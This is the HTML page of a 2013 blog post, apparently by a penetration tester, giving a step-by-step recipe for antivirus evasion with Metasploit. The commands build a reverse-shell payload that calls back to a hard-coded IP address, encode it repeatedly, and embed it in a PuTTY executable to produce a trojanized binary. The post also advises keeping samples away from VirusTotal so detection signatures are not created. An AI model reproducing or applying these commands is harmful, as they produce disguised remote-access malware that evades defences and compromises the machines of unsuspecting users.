@@ -1,0 +1,182 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Antivirus Evasion with Metasploit - cubalo</title>
+  <meta name="author" content="Matt">
+
+  
+  <meta name="description" content="Tweet Antivirus Evasion With Metasploit I&#8217;ve been working on producing a payload that can evade a specific antivirus product and figured I &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://cubalo.github.io/blog/2013/04/02/i/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="cubalo" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body >
+  <header role="banner" id="sidebar">
+    <!-- Logo -->
+<aside id="logo" class="clearfix">
+  <div class="clearfix">
+    <a href="/">cubalo</a>
+  </div>
+</aside>
+
+<ul id="menu">
+
+  <li class="title">
+    <h1 id="title"><a href="/">cubalo</a></h1>
+  </li>
+
+
+  <li class="subtitle">
+    <h2 id="subtitle">Ramblings of an OFFSEC grunt</h2>
+  </li>
+
+  <li class="link">
+    <a href="/about/">about</a>
+  </li>
+
+  <li class="link">
+    <a href="http://twitter.com/mchandx/">twitter</a>
+  </li>
+
+
+  <li class="link">
+    <a href="http://github.com/mchandx/">github</a>
+  </li>
+
+  <li class="link rss">
+    <a href="/atom.xml">rss feed</a>
+  </li>
+</ul>
+
+
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:cubalo.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+
+
+<!-- Octopress Love -->
+<aside id="octopress_linkback">
+  <a href="http://octopress.org/">
+    <span class="unicode_square">
+      <span class="unicode_circle">
+        &nbsp;
+      </span>
+    </span>
+    <span class="octopress">Powered by Octopress</span>
+  </a>
+</aside>
+
+  </header>
+  <section id="main">
+    <article class="post">
+  <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/blog/2013/04/02/i/" data-via="mchandx" data-counturl="http://cubalo.github.io/blog/2013/04/02/i/" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+  
+  <header>
+    
+      <h2 class="entry-title">Antivirus Evasion With Metasploit</h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-04-02T00:00:00-04:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+<p>I&#8217;ve been working on producing a payload that can evade a specific antivirus product and figured I would share my notes in a post. Most documentation I have found has not been updated since 2010.</p>
+<p>So the first thing we need to do is to figure out what payload we want to use. Since Metasploit is so well-known, there isn&#8217;t a huge difference in detection rates in their raw state as seen in the image below, so pick the one that works for you.</p>
+<p>[caption id=&#8221;&#8221; align=&#8221;alignnone&#8221; width=&#8221;575&#8221;]<img alt="" src="http://fuzzexp.org/wp-content/uploads/image/2012/02/145109XIT.jpg" width="575" height="349" /> Source: fuzzexp.org[/caption]</p>
+<p>I&#8217;ll use windows/shell/reverse_tcp for this post.  Pass the needed options to msfpayload and we&#8217;re done with the first step.</p>
+<pre>msfpayload windows/shell/reverse_tcp LHOST=62.141.42.101 LPORT=4444 R</pre>
+<p>The next thing we need to is pipe that to msfencode to encode the payload. In its current version, Metsploit comes with 27 different encoders. Shikata Ga Nai is the only &#8220;excellent&#8221; rated x86 encoder of the bunch, so we&#8217;ll use that. We also want to run the encoder 5 times, set the template to EXE, and specify the output location, so those options are thrown in there as well.</p>
+<pre>msfpayload windows/shell/reverse_tcp LHOST=62.141.42.101 LPORT=4444 R | msfencode -e x86/shikata_ga_nai -c 5  -t exe -o /root/payloads/basic.exe</pre>
+<p>The problem with this is that AV will usually pick up Metasploit&#8217;s default templates, so we need to either develop our own or provide a different one. Since making a custom EXE template is a little past my current skill level, we&#8217;ll use PuTTy as our template. Download the executable from their website and put it somewhere you&#8217;ll remember and pass it to msfencode with the -x option.</p>
+<pre>msfpayload windows/shell/reverse_tcp LHOST=62.141.42.101 LPORT=4444 R | msfencode -e x86/shikata_ga_nai -c 5 -x /root/putty.exe -t exe -o /root/payloads/putty.exe</pre>
+<p>Now we have a quintuple-encoded reverse_tcp payload embedded in PuTTy. Sounds great, right? Not so much. This piece of malware&#8217;s signature is picked up by 30 of 40 antivirus solutions according to VirusTotal.</p>
+<p>A quick note on VirusTotal: <strong>DON&#8217;T SUBMIT YOUR CUSTOM STUFF TO VIRUSTOTAL! </strong>The signature will be known and will begin to be detected. You&#8217;re best bet for testing is to have a box set up with the AV you&#8217;re trying to evade, update the signature the database, and then disconnect it from the network.</p>
+<p>Obviously, there are more advanced techniques and different ways than I&#8217;ve provided here, but this should provide a foundation to build off of. I will make a new post on writing custom executable templates once I get better understanding of that process.</p>
+<p>Until next time.</p>
+<p>More information and advanced tactics can be found here:</p>
+<p><a href="http://fuzzexp.org/anti-virus-evasion-for-metasploit.html">http://fuzzexp.org/anti-virus-evasion-for-metasploit.html</a></p>
+<p><a href="http://www.rapid7.com/resources/videos/evading-anti-virus-detection-with-metasploit.jsp">http://www.rapid7.com/resources/videos/evading-anti-virus-detection-with-metasploit.jsp</a></p>
+
+
+
+</article>
+
+
+    <nav role="navigation" id="pagination">
+
+</nav>
+  </section>
+  
+
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+</body>
+</html>
